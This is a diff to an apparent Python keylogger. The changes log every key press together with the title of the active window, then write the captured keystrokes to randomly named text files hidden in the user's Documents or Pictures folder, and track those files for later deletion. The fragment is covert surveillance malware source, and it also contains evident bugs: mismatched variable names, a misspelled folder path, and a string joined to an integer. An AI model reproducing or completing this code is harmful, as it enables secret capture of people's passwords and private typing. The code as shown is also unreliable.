@@ -22,6 +22,7 @@ delete_file = []
 def on_press(key):
     global old_app
 
+    """Finding the window that is currently used"""
     new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
     if new_app == 'Cortana':
@@ -39,8 +40,24 @@ def on_press(key):
 
     if key in substition:
         logged_data.append(substitution[substitution.index(key)+1])
+    else:
+        logged_data.append(key)
 
-    print(key)
+def write_file(count):
+    one = os.path.expanduser('~') + '/Documents/'
+    two = os.path.expanduser('~') + '/Pictrues/'
+
+    list = [one, two]
+
+    filepath = random.choice(list)
+
+    """counting logs"""
+    filename = str(count) + 'I' + random.randint(1000000, 9999999) + '.txt'
+    file = filepath + filename
+    delete_file.append(file)
+
+    with open(file, 'w') as fp:
+        fp.write(''.join(logged_data))
 
 """temporary function to stop listening when esc is pressed"""
 def on_release(key):
